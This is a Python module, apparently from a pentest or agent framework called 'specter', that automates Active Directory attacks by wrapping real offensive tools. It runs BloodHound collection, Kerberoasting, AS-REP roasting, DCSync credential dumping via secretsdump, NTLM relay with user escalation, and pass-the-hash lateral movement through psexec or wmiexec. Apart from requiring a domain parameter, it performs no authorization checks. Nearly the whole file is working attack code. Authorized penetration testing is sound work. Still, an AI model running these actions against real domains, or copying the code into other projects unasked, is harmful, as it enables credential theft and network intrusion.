import shutil, subprocess, time
from typing import Any
import structlog
from specter.skills.base import BaseSkill, SkillResult, RiskLevel

logger = structlog.get_logger()

class AdSkill(BaseSkill):
    name = "ad"
    description = "Active Directory attack techniques"
    category = "ad"
    risk_level = RiskLevel.INTRUSIVE

    def __init__(self):
        super().__init__()
        self.tools = ["ad.bloodhound_collect","ad.kerberoast","ad.asrep_roast","ad.ldap_enum","ad.certipy_check","ad.ntlm_relay","ad.dcsync","ad.pass_the_hash"]
        self.workflows = ["ad_assessment","ad_attack_chain"]

    def get_available_actions(self):
        return ["bloodhound_collect","kerberoast","asrep_roast","ldap_enum","certipy_check","ntlm_relay","dcsync","pass_the_hash"]

    async def validate_params(self, action, params):
        return "domain" in params if action in self.get_available_actions() else True

    async def execute(self, action, params):
        start = time.time()
        m = {"bloodhound_collect":self._bloodhound,"kerberoast":self._kerberoast,"asrep_roast":self._asrep_roast,"ldap_enum":self._ldap_enum,"certipy_check":self._certipy,"ntlm_relay":self._ntlm_relay,"dcsync":self._dcsync,"pass_the_hash":self._pth}
        fn = m.get(action)
        return await fn(params, start) if fn else SkillResult(success=False, error=f"Accion desconocida: {action}")

    async def _bloodhound(self, p, s):
        d,u,pw = p["domain"],p.get("user",""),p.get("password","")
        if not shutil.which("bloodhound-python"):
            return SkillResult(success=False,error="bloodhound-python no instalado",execution_time=time.time()-s)
        cmd = ["bloodhound-python","-d",d,"-dc",p.get("dc",d),"-c","All","-ns",p.get("dc",d)]
        if u and pw: cmd += ["-u",u,"-p",pw]
        elif u: cmd += ["-u",u,"--no-pass"]
        try:
            r = subprocess.run(cmd,capture_output=True,text=True,timeout=p.get("timeout",600))
            out = r.stdout + r.stderr
            f = [{"type":"bloodhound","domain":d}] if r.returncode==0 else []
            return SkillResult(success=r.returncode==0,output=out,findings=f,execution_time=time.time()-s)
        except subprocess.TimeoutExpired:
            return SkillResult(success=False,error="Timeout BloodHound",execution_time=time.time()-s)
        except Exception as e:
            return SkillResult(success=False,error=str(e),execution_time=time.time()-s)

    async def _kerberoast(self, p, s):
        d,u,pw = p["domain"],p.get("user",""),p.get("password","")
        tool = next((n for n in ["GetUserSPNs.py","impacket-GetUserSPNs"] if shutil.which(n)),None)
        if not tool: return SkillResult(success=False,error="Impacket GetUserSPNs no instalado",execution_time=time.time()-s)
        creds = f"{d}/{u}:{pw}" if u and pw else f"{d}/"
        cmd = [tool,creds,"-dc-ip",p.get("dc_ip",d),"-request","-outputformat","hashcat"]
        try:
            r = subprocess.run(cmd,capture_output=True,text=True,timeout=300)
            out = r.stdout+r.stderr
            f = [{"type":"kerberoast","severity":"HIGH","detail":"Kerberoastable accounts found"}] if "krb5tgs" in out.lower() else []
            return SkillResult(success=r.returncode==0,output=out,findings=f,execution_time=time.time()-s)
        except Exception as e:
            return SkillResult(success=False,error=str(e),execution_time=time.time()-s)

    async def _asrep_roast(self, p, s):
        d = p["domain"]
        tool = next((n for n in ["GetNPUsers.py","impacket-GetNPUsers"] if shutil.which(n)),None)
        if not tool: return SkillResult(success=False,error="Impacket GetNPUsers no instalado",execution_time=time.time()-s)
        cmd = [tool,f"{d}/","-dc-ip",p.get("dc_ip",d),"-request","-format","hashcat","-outputfile","/tmp/specter_asrep.txt"]
        if p.get("users"): cmd += ["-usersfile",p["users"]]
        try:
            r = subprocess.run(cmd,capture_output=True,text=True,timeout=300)
            out = r.stdout+r.stderr
            f = [{"type":"asrep_roast","severity":"HIGH","detail":"AS-REP roastable accounts found"}] if "$krb5asrep$" in out.lower() else []
            return SkillResult(success=r.returncode==0,output=out,findings=f,execution_time=time.time()-s)
        except Exception as e:
            return SkillResult(success=False,error=str(e),execution_time=time.time()-s)

    async def _ldap_enum(self, p, s):
        d,u,pw = p["domain"],p.get("user",""),p.get("password","")
        dc = p.get("dc_ip",d)
        findings,out_parts = [],[]
        if shutil.which("ldapdomaindump"):
            cmd = ["ldapdomaindump","-u",f"{d}\\{u}" if u else d,"-p",pw,dc,"-o",f"/tmp/specter_ldap_{d}"]
            try:
                r = subprocess.run(cmd,capture_output=True,text=True,timeout=300)
                out_parts.append(r.stdout+r.stderr)
                if r.returncode==0: findings.append({"type":"ldap_domain_dump","domain":d})
            except Exception: pass
        if not findings and shutil.which("ldapsearch"):
            bind = f"{u}@{d}" if u else ""
            cmd = ["ldapsearch","-H",f"ldap://{dc}","-D",bind,"-w",pw,"-b",f"DC={d.replace('.',',DC=')}","(objectClass=*)"]
            try:
                r = subprocess.run(cmd,capture_output=True,text=True,timeout=120)
                out_parts.append(r.stdout)
                for line in r.stdout.split("\n"):
                    if "sAMAccountName:" in line or "dNSHostName:" in line:
                        findings.append({"type":"ldap_entry","value":line.strip()})
            except Exception as e:
                return SkillResult(success=False,error=str(e),execution_time=time.time()-s)
        if not findings: findings.append({"type":"ldap_enum","value":"No results"})
        return SkillResult(success=True,output="\n".join(out_parts),findings=findings,execution_time=time.time()-s)

    async def _certipy(self, p, s):
        if not shutil.which("certipy"): return SkillResult(success=False,error="certipy no instalado",execution_time=time.time()-s)
        d,u,pw = p["domain"],p.get("user",""),p.get("password","")
        cmd = ["certipy","find","-u",f"{u}@{d}" if u else d,"-p",pw,"-dc-ip",p.get("dc_ip",d),"-stdout"]
        try:
            r = subprocess.run(cmd,capture_output=True,text=True,timeout=300)
            out = r.stdout+r.stderr
            f = [{"type":"adcs_vuln","severity":"HIGH","detail":l.strip()} for l in out.split("\n") if any(k in l.lower() for k in ["vulnerable","esc","enrollment","misconfigured"])]
            return SkillResult(success=r.returncode==0,output=out,findings=f or [{"type":"adcs_check","value":"No obvious misconfigs"}],execution_time=time.time()-s)
        except Exception as e:
            return SkillResult(success=False,error=str(e),execution_time=time.time()-s)

    async def _ntlm_relay(self, p, s):
        tool = next((n for n in ["ntlmrelayx.py","impacket-ntlmrelayx"] if shutil.which(n)),None)
        if not tool: return SkillResult(success=False,error="Impacket ntlmrelayx no instalado",execution_time=time.time()-s)
        target = p.get("target","")
        if not target: return SkillResult(success=False,error="Target required",execution_time=time.time()-s)
        cmd = [tool,"-t",target,"-smb2support"]
        if p.get("escalate_user"): cmd += ["--escalate-user",p["escalate_user"]]
        try:
            r = subprocess.run(cmd,capture_output=True,text=True,timeout=30)
            return SkillResult(success=True,output=r.stdout+r.stderr,findings=[{"type":"ntlm_relay","target":target}],execution_time=time.time()-s)
        except subprocess.TimeoutExpired:
            return SkillResult(success=True,output="ntlmrelayx started (listener)",findings=[{"type":"ntlm_relay_listener","target":target}],execution_time=time.time()-s)
        except Exception as e:
            return SkillResult(success=False,error=str(e),execution_time=time.time()-s)

    async def _dcsync(self, p, s):
        tool = next((n for n in ["secretsdump.py","impacket-secretsdump"] if shutil.which(n)),None)
        if not tool: return SkillResult(success=False,error="Impacket secretsdump no instalado",execution_time=time.time()-s)
        d,u,pw = p["domain"],p.get("user",""),p.get("password","")
        target = p.get("target",d)
        creds = f"{d}/{u}:{pw}" if u and pw else f"{d}/"
        cmd = [tool,creds,target]
        if p.get("output_file"): cmd += ["-outputfile",p["output_file"]]
        try:
            r = subprocess.run(cmd,capture_output=True,text=True,timeout=300)
            out = r.stdout+r.stderr
            f = [{"type":"dcsync","severity":"CRIT","detail":"Credentials dumped via DCSync"}] if any(k in out for k in ["SAMKey","$KRBTGT"]) else []
            return SkillResult(success=r.returncode==0,output=out,findings=f,execution_time=time.time()-s)
        except Exception as e:
            return SkillResult(success=False,error=str(e),execution_time=time.time()-s)

    async def _pth(self, p, s):
        d,target,u = p["domain"],p.get("target",""),p.get("user","")
        if not target: return SkillResult(success=False,error="Target required",execution_time=time.time()-s)
        for tn in [("psexec.py","impacket-psexec"),("wmiexec.py","impacket-wmiexec")]:
            tool = next((n for n in tn if shutil.which(n)),None)
            if tool:
                creds = f"{d}/{u}"
                if p.get("nthash"): creds += f":{p.get('lmhash','')}:{p['nthash']}"
                elif p.get("password"): creds += f":{p['password']}"
                cmd = [tool,creds,target]
                try:
                    r = subprocess.run(cmd,capture_output=True,text=True,timeout=120)
                    out = r.stdout+r.stderr
                    f = [{"type":"lateral_movement","severity":"CRIT","tool":tool,"target":target}] if any(k in out.lower() for k in ["whoami","help"]) else []
                    return SkillResult(success=r.returncode==0,output=out,findings=f,execution_time=time.time()-s)
                except Exception: continue
        return SkillResult(success=False,error="Neither psexec.py nor wmiexec.py found",execution_time=time.time()-s)
